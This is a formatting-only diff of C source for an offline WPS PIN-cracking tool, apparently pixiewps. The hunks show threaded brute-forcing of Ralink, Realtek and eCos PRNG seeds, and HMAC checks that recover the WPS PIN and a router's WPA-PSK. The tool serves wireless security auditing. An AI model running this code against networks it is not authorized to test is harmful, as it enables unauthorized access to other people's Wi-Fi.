@@ -28,7 +28,7 @@
 #include <assert.h>
 #include <stdarg.h> /* libtommath.c */
 #if defined(_WIN32) || defined(__WIN32__)
-#include <windows.h>
+# include <windows.h>
 #endif
 
 #include <sys/types.h>
@@ -94,14 +94,14 @@ static struct job_control {
 	volatile uint32_t nonce_seed;
 } job_control;
 
-static void crack_thread_rtl(struct crack_job *j) {
+static void crack_thread_rtl(struct crack_job *j)
+{
 	struct glibc_lazyprng glibc_lazyprng;
 	uint32_t seed = j->start;
 	uint32_t limit = job_control.end;
 	uint32_t tmp[4];
 
 	while (!job_control.nonce_seed) {
-		unsigned int i;
 		glibc_lazyseed(&glibc_lazyprng, seed);
 		if (glibc_rand1(&glibc_lazyprng) == job_control.randr_enonce[0]) {
 			if (!memcmp(glibc_randfill(&glibc_lazyprng, tmp), job_control.randr_enonce, WPS_NONCE_LEN)) {
@@ -128,17 +128,18 @@ struct ralink_randstate {
 	uint32_t sreg;
 };
 
-static unsigned char ralink_randbyte(struct ralink_randstate *state) {
+static unsigned char ralink_randbyte(struct ralink_randstate *state)
+{
 	unsigned char r = 0, result;
 
-	if (state->sreg == 0)
-		state->sreg = 1;
+	if (state->sreg == 0) state->sreg = 1;
 
-	for (int i = 0; i< 8; i++) {
+	for (int i = 0; i < 8; i++) {
 		if (state->sreg & 0x00000001) {
 			state->sreg = ((state->sreg ^ 0x80000057) >> 1) | 0x80000000;
 			result = 1;
-		} else {
+		}
+		else {
 			state->sreg = state->sreg >> 1;
 			result = 0;
 		}
@@ -147,21 +148,22 @@ static unsigned char ralink_randbyte(struct ralink_randstate *state) {
 	return r;
 }
 
-static int crack_rt(uint32_t start, uint32_t end, uint32_t *result) {
+static int crack_rt(uint32_t start, uint32_t end, uint32_t *result)
+{
 	uint32_t seed;
 	struct ralink_randstate prng;
 	unsigned char testnonce[16] = {0};
-	unsigned char *search_nonce = (void*) job_control.randr_enonce;
-	int i;
+	unsigned char *search_nonce = (void *)job_control.randr_enonce;
 
 	for (seed = start; seed < end; seed++) {
+		int i;
 		prng.sreg = seed;
 		testnonce[0] = ralink_randbyte(&prng);
 		if (testnonce[0] != search_nonce[0]) continue;
 		for (i = 1; i < 4; i++) testnonce[i] = ralink_randbyte(&prng);
-		if(memcmp(testnonce, search_nonce, 4)) continue;
-		for (i = 4; i < 16; i++) testnonce[i] = ralink_randbyte(&prng);
-		if(!memcmp(testnonce, search_nonce, 16)) {
+		if (memcmp(testnonce, search_nonce, 4)) continue;
+		for (i = 4; i < WPS_NONCE_LEN; i++) testnonce[i] = ralink_randbyte(&prng);
+		if (!memcmp(testnonce, search_nonce, WPS_NONCE_LEN)) {
 			*result = seed;
 			return 1;
 		}
@@ -169,27 +171,29 @@ static int crack_rt(uint32_t start, uint32_t end, uint32_t *result) {
 	return 0;
 }
 
-static void crack_thread_rt(struct crack_job *j) {
+static void crack_thread_rt(struct crack_job *j)
+{
 	uint64_t tmp;
 	uint32_t start = j->start, end;
 	uint32_t res;
 
 	while (!job_control.nonce_seed) {
-		tmp = (uint64_t) start + (uint64_t) SEEDS_PER_JOB_BLOCK;
-		if (tmp > (uint64_t) job_control.end) tmp =  job_control.end;
+		tmp = (uint64_t)start + (uint64_t)SEEDS_PER_JOB_BLOCK;
+		if (tmp > (uint64_t)job_control.end) tmp =  job_control.end;
 		end = tmp;
 
 		if (crack_rt(start, end, &res)) {
 			job_control.nonce_seed = res;
 			DEBUG_PRINT("Seed found %u", (unsigned) res);
 		}
-		tmp = (uint64_t) start + (uint64_t) (SEEDS_PER_JOB_BLOCK * job_control.jobs);
-		if (tmp > (uint64_t) job_control.end) break;
+		tmp = (uint64_t)start + (uint64_t)(SEEDS_PER_JOB_BLOCK * job_control.jobs);
+		if (tmp > (uint64_t)job_control.end) break;
 		start = tmp;
 	}
 }
 
-static void *crack_thread(void *arg) {
+static void *crack_thread(void *arg)
+{
 	struct crack_job *j = arg;
 
 	if (job_control.mode == RTL819x)
@@ -203,25 +207,29 @@ static void *crack_thread(void *arg) {
 }
 
 #ifndef PTHREAD_STACK_MIN
-static void setup_thread(int i) {
+static void setup_thread(int i)
+{
 	pthread_create(&job_control.crack_jobs[i].thr, 0, crack_thread, &job_control.crack_jobs[i]);
 }
 #else
-static size_t getminstacksize(size_t minimum) {
+static size_t getminstacksize(size_t minimum)
+{
 	return (minimum < PTHREAD_STACK_MIN) ? PTHREAD_STACK_MIN : minimum;
 }
 
-static void setup_thread(int i) {
-	size_t stacksize = getminstacksize(64*1024);
+static void setup_thread(int i)
+{
+	size_t stacksize = getminstacksize(64 * 1024);
 	pthread_attr_t attr;
 	int attr_ok = pthread_attr_init(&attr) == 0 ;
-	if(attr_ok) pthread_attr_setstacksize(&attr, stacksize);
+	if (attr_ok) pthread_attr_setstacksize(&attr, stacksize);
 	pthread_create(&job_control.crack_jobs[i].thr, &attr, crack_thread, &job_control.crack_jobs[i]);
-	if(attr_ok) pthread_attr_destroy(&attr);
+	if (attr_ok) pthread_attr_destroy(&attr);
 }
 #endif
 
-static void init_crack_jobs(struct global *wps, int mode) {
+static void init_crack_jobs(struct global *wps, int mode)
+{
 	job_control.jobs = wps->jobs;
 	job_control.end = (mode == RTL819x) ? wps->end : 0xffffffffu;
 	job_control.mode = mode;
@@ -230,7 +238,7 @@ static void init_crack_jobs(struct global *wps, int mode) {
 
 	/* Converting enrollee nonce to the sequence may be generated by current random function */
 	int i, j = 0;
-	if(mode == RTL819x)
+	if (mode == RTL819x)
 		for (i = 0; i < 4; i++) {
 			job_control.randr_enonce[i] |= wps->e_nonce[j++];
 			job_control.randr_enonce[i] <<= 8;
@@ -241,29 +249,30 @@ static void init_crack_jobs(struct global *wps, int mode) {
 			job_control.randr_enonce[i] |= wps->e_nonce[j++];
 		}
 	else
-		memcpy(job_control.randr_enonce, wps->e_nonce, 16);
+		memcpy(job_control.randr_enonce, wps->e_nonce, WPS_NONCE_LEN);
 
 	job_control.crack_jobs = malloc(wps->jobs * sizeof (struct job_control));
 	uint32_t curr = (mode == RTL819x) ? wps->start : 0;
 	int32_t add = (mode == RTL819x) ? -SEEDS_PER_JOB_BLOCK : SEEDS_PER_JOB_BLOCK;
-	for(i = 0; i < wps->jobs; i++) {
+	for (i = 0; i < wps->jobs; i++) {
 		job_control.crack_jobs[i].start = curr;
 		setup_thread(i);
 		curr += add;
 	}
 }
 
-static uint32_t collect_crack_jobs() {
-	int i;
-	for (i = 0; i < job_control.jobs; i++)	{
-		void* ret;
+static uint32_t collect_crack_jobs()
+{
+	for (int i = 0; i < job_control.jobs; i++) {
+		void *ret;
 		pthread_join(job_control.crack_jobs[i].thr, &ret);
 	}
 	free(job_control.crack_jobs);
 	return job_control.nonce_seed;
 }
 
-unsigned int hardware_concurrency() {
+unsigned int hardware_concurrency()
+{
 #if defined(PTW32_VERSION) || defined(__hpux)
 	return pthread_num_processors_np();
 #elif defined(__APPLE__) || defined(__FreeBSD__)
@@ -284,8 +293,8 @@ unsigned int hardware_concurrency() {
 #endif
 }
 
-int main(int argc, char **argv) {
-
+int main(int argc, char **argv)
+{
 	struct global *wps;
 	if ((wps = calloc(1, sizeof(struct global)))) {
 		unsigned int cores = hardware_concurrency();
@@ -296,7 +305,9 @@ int main(int argc, char **argv) {
 		if (!wps->error)
 			goto memory_err;
 		wps->error[0] = '\n';
-	} else {
+	}
+	else {
+
 memory_err:
 		fprintf(stderr, "\n [X] Memory allocation error!\n");
 		return MEM_ERROR;
@@ -400,8 +411,7 @@ memory_err:
 				wps->anylength = 1;
 				break;
 			case 'o':
-				if (!freopen(optarg, "w", stdout))
-				{
+				if (!freopen(optarg, "w", stdout)) {
 					snprintf(wps->error, 256, "\n [!] Failed to open file for writing -- %s\n\n", optarg);
 					goto usage_err;
 				}
@@ -413,11 +423,11 @@ memory_err:
 				}
 				break;
 			case 'V':
-			{
 				if (c > 1) { /* If --version is used then no other argument should be supplied */
 					snprintf(wps->error, 256, "\n [!] Bad use of argument --version (-V)!\n\n");
 					goto usage_err;
-				} else {
+				}
+				else {
 					unsigned int cores = hardware_concurrency();
 					struct timeval t_current;
 					gettimeofday(&t_current, 0);
@@ -437,12 +447,11 @@ memory_err:
 					free(wps);
 					return ARG_ERROR;
 				}
-			}
 			case 'h':
 				goto usage_err;
 				break;
 			case  0 :
-				if (strcmp("help", long_options[long_index].name) == 0) {
+				if (!strcmp("help", long_options[long_index].name)) {
 					fprintf(stderr, v_usage, SHORT_VERSION,
 						p_mode_name[RT],
 						p_mode_name[ECOS_SIMPLE],
@@ -456,7 +465,7 @@ memory_err:
 				}
 				goto usage_err;
 			case  1 :
-				if (strcmp("mode", long_options[long_index].name) == 0) {
+				if (!strcmp("mode", long_options[long_index].name)) {
 					if (parse_mode(optarg, p_mode, MODE_LEN)) {
 						snprintf(wps->error, 256, "\n [!] Bad modes -- %s\n\n", optarg);
 						goto usage_err;
@@ -466,7 +475,7 @@ memory_err:
 				}
 				goto usage_err;
 			case  2 :
-				if (strcmp("start", long_options[long_index].name) == 0) {
+				if (!strcmp("start", long_options[long_index].name)) {
 					if (get_unix_datetime(optarg, &(start_p))) {
 						snprintf(wps->error, 256, "\n [!] Bad starting point -- %s\n\n", optarg);
 						goto usage_err;
@@ -475,7 +484,7 @@ memory_err:
 				}
 				goto usage_err;
 			case  3 :
-				if (strcmp("end", long_options[long_index].name) == 0) {
+				if (!strcmp("end", long_options[long_index].name)) {
 					if (get_unix_datetime(optarg, &(end_p))) {
 						snprintf(wps->error, 256, "\n [!] Bad ending point -- %s\n\n", optarg);
 						goto usage_err;
@@ -514,8 +523,10 @@ memory_err:
 	if (argc - optind != 0) {
 		snprintf(wps->error, 256, "\n [!] Unknown extra argument(s)!\n\n");
 		goto usage_err;
-	} else {
+	}
+	else {
 		if (!c) {
+
 usage_err:
 			fprintf(stderr, usage, SHORT_VERSION, argv[0], wps->error);
 
@@ -527,9 +538,9 @@ usage_err:
 			free(wps->e_nonce);
 			free(wps->r_nonce);
 			free(wps->e_bssid);
-
 			free(wps->error);
 			free(wps);
+
 			return ARG_ERROR;
 		}
 	}
@@ -676,7 +687,8 @@ usage_err:
 			memcpy(buffer, vtag->data, tag_size);
 			buffer[tag_size] = '\0';
 			printf("\n [+] WPA-PSK:  %s", buffer);
-		} else {
+		}
+		else {
 			printf("\n [-] WPA-PSK not found!");
 		}
 
@@ -740,14 +752,16 @@ usage_err:
 		if (!memcmp(wps->pke, wps_rtl_pke, WPS_PKEY_LEN)) {
 			p_mode[0] = RTL819x;
 			p_mode[1] = NONE;
-		} else {
+		}
+		else {
 			p_mode[0] = RT;
 			if (wps->pke && (!(wps->e_nonce[0] & 0x80) && !(wps->e_nonce[4]  & 0x80) &&
 					!(wps->e_nonce[8] & 0x80) && !(wps->e_nonce[12] & 0x80))) {
 				p_mode[1] = RTL819x;
 				p_mode[2] = ECOS_SIMPLE;
 				p_mode[3] = NONE;
-			} else {
+			}
+			else {
 				p_mode[1] = ECOS_SIMPLE;
 				p_mode[2] = NONE;
 			}
@@ -782,27 +796,33 @@ usage_err:
 				if (end_p > start_p) {
 					wps->start = end_p;
 					wps->end = start_p;
-				} else {
+				}
+				else {
 					wps->start = start_p;
 					wps->end = end_p;
 				}
-			} else {
+			}
+			else {
 				if (start_p >= wps->start) {
 					snprintf(wps->error, 256, "\n [!] Bad Starting point!\n\n");
 					goto usage_err;
-				} else {
+				}
+				else {
 					wps->end = start_p;
 				}
 			}
-		} else {
+		}
+		else {
 			if (end_p != (time_t) -1) {
 				if (end_p >= wps->start) {
 					snprintf(wps->error, 256, "\n [!] Bad Ending point!\n\n");
 					goto usage_err;
-				} else {
+				}
+				else {
 					wps->end = end_p;
 				}
-			} else {
+			}
+			else {
 				if (wps->bruteforce) {
 					wps->start += SEC_PER_DAY; /* Extra 1 day */
 					wps->end = 0;
@@ -877,15 +897,18 @@ usage_err:
 							free(wps->kdk);
 						}
 						free(buffer);
-					} else {
+					}
+					else {
 						snprintf(wps->error, 256, "\n [!] Neither --authkey and --e-bssid have been supplied!\n\n");
 						goto usage_err;
 					}
-				} else {
+				}
+				else {
 					snprintf(wps->error, 256, "\n [!] Neither --authkey and --r-nonce have been supplied!\n\n");
 					goto usage_err;
 				}
-			} else {
+			}
+			else {
 				snprintf(wps->error, 256, "\n [!] Neither --authkey and --e-nonce have been supplied!\n\n");
 				goto usage_err;
 			}
@@ -924,7 +947,8 @@ usage_err:
 			if (r == PIN_FOUND) {
 				found_p_mode = RT;
 				DEBUG_PRINT("Pin found");
-			} else if (r == MEM_ERROR) {
+			}
+			else if (r == MEM_ERROR) {
 				goto memory_err;
 			}
 
@@ -958,14 +982,16 @@ usage_err:
 					if (r == PIN_FOUND) {
 						found_p_mode = RT;
 						DEBUG_PRINT("Pin found");
-					} else if (r == MEM_ERROR) {
+					}
+					else if (r == MEM_ERROR) {
 						goto memory_err;
 					}
 				}
 			}
 
 		/* 2 */
-		} else if (p_mode[k] == ECOS_SIMPLE && wps->e_nonce) {
+		}
+		else if (p_mode[k] == ECOS_SIMPLE && wps->e_nonce) {
 
 			DEBUG_PRINT(" * Mode: %d (%s)", ECOS_SIMPLE, p_mode_name[ECOS_SIMPLE]);
 
@@ -1004,13 +1030,15 @@ usage_err:
 				if (r == PIN_FOUND) {
 					found_p_mode = ECOS_SIMPLE;
 					DEBUG_PRINT("Pin found");
-				} else if (r == MEM_ERROR) {
+				}
+				else if (r == MEM_ERROR) {
 					goto memory_err;
 				}
 			}
 
 		/* 3 */
-		} else if (p_mode[k] == RTL819x && wps->e_nonce) {
+		}
+		else if (p_mode[k] == RTL819x && wps->e_nonce) {
 
 			DEBUG_PRINT(" * Mode: %d (%s)", RTL819x, p_mode_name[RTL819x]);
 
@@ -1027,7 +1055,8 @@ usage_err:
 			if (r == PIN_FOUND) {
 				found_p_mode = RTL819x;
 				DEBUG_PRINT("Pin found");
-			} else if (r == MEM_ERROR) {
+			}
+			else if (r == MEM_ERROR) {
 				goto memory_err;
 			}
 
@@ -1039,7 +1068,8 @@ usage_err:
 							goto memory_err;
 						snprintf(wps->warning, 256, " [!] Small DH keys is not supported for mode %d!\n\n", RTL819x);
 					}
-				} else {
+				}
+				else {
 
 					/* Checks if the sequence may actually be generated by current random function */
 					if (!(wps->e_nonce[0] & 0x80) && !(wps->e_nonce[4]  & 0x80) &&
@@ -1094,11 +1124,13 @@ usage_err:
 								if (r == PIN_FOUND) {
 									found_p_mode = RTL819x;
 									DEBUG_PRINT("Pin found");
-								} else if (r == PIN_ERROR) {
+								}
+								else if (r == PIN_ERROR) {
 									if (i == 1) {
 										memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN); /* E-S1 = E-Nonce != E-S2 */
 										memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* Chaching for next round, see below */
-									} else {
+									}
+									else {
 										memcpy(wps->e_s1, tmp_s_nonce, WPS_SECRET_NONCE_LEN);
 										memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* E-S1 = old E-S1, E-S2 = new E-S2 */
 									}
@@ -1114,10 +1146,12 @@ usage_err:
 									if (r2 == PIN_FOUND) {
 										found_p_mode = RTL819x;
 										DEBUG_PRINT("Pin found");
-									} else if (r2 == MEM_ERROR) {
+									}
+									else if (r2 == MEM_ERROR) {
 										goto memory_err;
 									}
-								} else if (r == MEM_ERROR) {
+								}
+								else if (r == MEM_ERROR) {
 									goto memory_err;
 								}
 							} while (found_p_mode == NONE && i <= MODE3_TRIES);
@@ -1146,11 +1180,13 @@ usage_err:
 									if (r == PIN_FOUND) {
 										found_p_mode = RTL819x;
 										DEBUG_PRINT("Pin found");
-									} else if (r == PIN_ERROR) {
+									}
+									else if (r == PIN_ERROR) {
 										if (i == 1) {
 											memcpy(wps->e_s2, wps->e_nonce, WPS_SECRET_NONCE_LEN); /* E-S1 = E-Nonce != E-S2 */
 											memcpy(tmp_s_nonce, wps->e_s1, WPS_SECRET_NONCE_LEN);  /* Chaching for next round, see below */
-										} else {
+										}
+										else {
 											memcpy(wps->e_s2, tmp_s_nonce, WPS_SECRET_NONCE_LEN);
 											memcpy(tmp_s_nonce, wps->e_s1, WPS_SECRET_NONCE_LEN);  /* E-S1 = old E-S1, E-S2 = new E-S2 */
 										}
@@ -1166,10 +1202,12 @@ usage_err:
 										if (r2 == PIN_FOUND) {
 											found_p_mode = RTL819x;
 											DEBUG_PRINT("Pin found");
-										} else if (r2 == MEM_ERROR) {
+										}
+										else if (r2 == MEM_ERROR) {
 											goto memory_err;
 										}
-									} else if (r == MEM_ERROR) {
+									}
+									else if (r == MEM_ERROR) {
 										goto memory_err;
 									}
 								} while (found_p_mode == NONE && i <= MODE3_TRIES);
@@ -1189,7 +1227,8 @@ usage_err:
 			}
 
 		/* 4 */
-		} else if (p_mode[k] == ECOS_SIMPLEST && wps->e_nonce) {
+		}
+		else if (p_mode[k] == ECOS_SIMPLEST && wps->e_nonce) {
 
 			DEBUG_PRINT(" * Mode: %d (%s)", ECOS_SIMPLEST, p_mode_name[ECOS_SIMPLEST]);
 
@@ -1229,13 +1268,15 @@ usage_err:
 				if (r == PIN_FOUND) {
 					found_p_mode = ECOS_SIMPLEST;
 					DEBUG_PRINT("Pin found");
-				} else if (r == MEM_ERROR) {
+				}
+				else if (r == MEM_ERROR) {
 					goto memory_err;
 				}
 			}
 
 		/* 5 */
-		} else if (p_mode[k] == ECOS_KNUTH && wps->e_nonce) {
+		}
+		else if (p_mode[k] == ECOS_KNUTH && wps->e_nonce) {
 
 			DEBUG_PRINT(" * Mode: %d (%s)", ECOS_KNUTH, p_mode_name[ECOS_KNUTH]);
 
@@ -1275,7 +1316,8 @@ usage_err:
 				if (r == PIN_FOUND) {
 					found_p_mode = ECOS_KNUTH;
 					DEBUG_PRINT("Pin found");
-				} else if (r == MEM_ERROR) {
+				}
+				else if (r == MEM_ERROR) {
 					goto memory_err;
 				}
 			}
@@ -1323,7 +1365,8 @@ usage_err:
 						ts = *gmtime(&seed_time);
 						strftime(buffer, 30, "%c", &ts);
 						printf(" (%s UTC)", buffer);
-					} else {
+					}
+					else {
 						printf("\n [*] Seed N1:  0x%08x", nonce_seed);
 						printf("\n [*] Seed ES1: 0x%08x", s1_seed);
 						printf("\n [*] Seed ES2: 0x%08x", s2_seed);
@@ -1348,10 +1391,12 @@ usage_err:
 		}
 		if (pin[0] == '\0') {
 			printf("\n [+] WPS pin:  <empty>");
-		} else {
+		}
+		else {
 			printf("\n [+] WPS pin:  %s", pin);
 		}
-	} else {
+	}
+	else {
 		printf("\n [-] WPS pin not found!");
 	}
 	printf("\n\n [*] Time taken: %lu s %lu ms\n\n", ms_elapsed / 1000, ms_elapsed % 1000);
@@ -1388,13 +1433,15 @@ usage_err:
 }
 
 /* Simplest */
-uint32_t ecos_rand_simplest(uint32_t *seed) {
+uint32_t ecos_rand_simplest(uint32_t *seed)
+{
 	*seed = (*seed * 1103515245) + 12345; /* Permutate seed */
 	return *seed;
 }
 
 /* Simple, Linear congruential generator */
-uint32_t ecos_rand_simple(uint32_t *seed) {
+uint32_t ecos_rand_simple(uint32_t *seed)
+{
 	uint32_t s = *seed;
 	uint32_t uret;
 
@@ -1410,7 +1457,8 @@ uint32_t ecos_rand_simple(uint32_t *seed) {
 }
 
 /* Mersenne-Knuth */
-uint32_t ecos_rand_knuth(uint32_t *seed) {
+uint32_t ecos_rand_knuth(uint32_t *seed)
+{
 	#define MM 2147483647 /* Mersenne prime */
 	#define AA 48271      /* This does well in the spectral test */
 	#define QQ 44488      /* MM / AA */
@@ -1424,7 +1472,8 @@ uint32_t ecos_rand_knuth(uint32_t *seed) {
 }
 
 /* Simple power function */
-int int_pow(int a, int exp) {
+int int_pow(int a, int exp)
+{
 	if (exp <= 0) return 1;
 	int r = a;
 
@@ -1433,7 +1482,8 @@ int int_pow(int a, int exp) {
 }
 
 /* PIN cracking attempt */
-uint_fast8_t crack(struct global *g, char *pin) {
+uint_fast8_t crack(struct global *g, char *pin)
+{
 	struct global *wps = g;
 	unsigned int first_half = 0;
 	unsigned int second_half = 0;
@@ -1466,15 +1516,16 @@ uint_fast8_t crack(struct global *g, char *pin) {
 				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
 				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
 				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
-					WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+						WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
 
 				if (memcmp(result, wps->e_hash1, WPS_HASH_LEN)) {
 					first_half++;
-				} else {
-					if (i == 0)
-					{
+				}
+				else {
+					if (i == 0) {
 						pin[0] = '\0';
-					} else {
+					}
+					else {
 						snprintf((char *)&mask, 5, "%%0%uu", i);
 						snprintf(pin, WPS_PIN_LEN / 2 + 1, mask, first_half);
 					}
@@ -1495,26 +1546,29 @@ uint_fast8_t crack(struct global *g, char *pin) {
 						memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
 						memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
 						hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
-							WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+								WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
 
 						if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
 							second_half++;
-						} else {
-							if (j > 0)
-							{
+						}
+						else {
+							if (j > 0) {
 								snprintf((char *)&mask, 5, "%%0%uu", j);
 								snprintf(pin + WPS_PIN_LEN / 2, WPS_PIN_LEN / 2 + 1, mask, second_half);
 							}
+
 							/* Second half found */
 							found = 1;
 							break;
 						}
 					}
 				}
+
 				/* First half found, but not second */
 				break;
 			}
 		}
+
 		free(buffer);
 		free(result);
 
@@ -1528,9 +1582,10 @@ uint_fast8_t crack(struct global *g, char *pin) {
 	memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
 	memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
 	hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
-		WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+			WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
 
 	if (!memcmp(result, wps->e_hash1, WPS_HASH_LEN)) {
+
 		/* Second half must be empty too */
 		hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, NULL, 0, wps->psk2);
 		memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
@@ -1538,9 +1593,10 @@ uint_fast8_t crack(struct global *g, char *pin) {
 		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
 		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
 		hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
-			WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+				WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
 
 		if (!memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
+
 			/* Empty pin detected */
 			free(buffer);
 			free(result);
@@ -1559,13 +1615,12 @@ uint_fast8_t crack(struct global *g, char *pin) {
 		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
 		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
 		hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
-			WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+				WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
 
-		if (memcmp(result, wps->e_hash1, WPS_HASH_LEN)) {
+		if (memcmp(result, wps->e_hash1, WPS_HASH_LEN))
 			first_half++;
-		} else {
+		else
 			break;
-		}
 	}
 
 	if (first_half < 10000) { /* First half found */
@@ -1581,11 +1636,12 @@ uint_fast8_t crack(struct global *g, char *pin) {
 			memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
 			memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
 			hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
-				WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+					WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
 
 			if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
 				second_half++;
-			} else {
+			}
+			else {
 				second_half = c_second_half;
 				found = 1;
 				break;
@@ -1611,11 +1667,12 @@ uint_fast8_t crack(struct global *g, char *pin) {
 				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
 				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
 				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
-					WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+						WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
 
 				if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
 					second_half++;
-				} else {
+				}
+				else {
 					found = 1;
 					break;
 				}
@@ -1627,5 +1684,6 @@ uint_fast8_t crack(struct global *g, char *pin) {
 	free(result);
 
 	snprintf(pin, WPS_PIN_LEN + 1, "%08u", first_half * 10000 + second_half);
+
 	return !found; /* 0 success, 1 failure */
 }
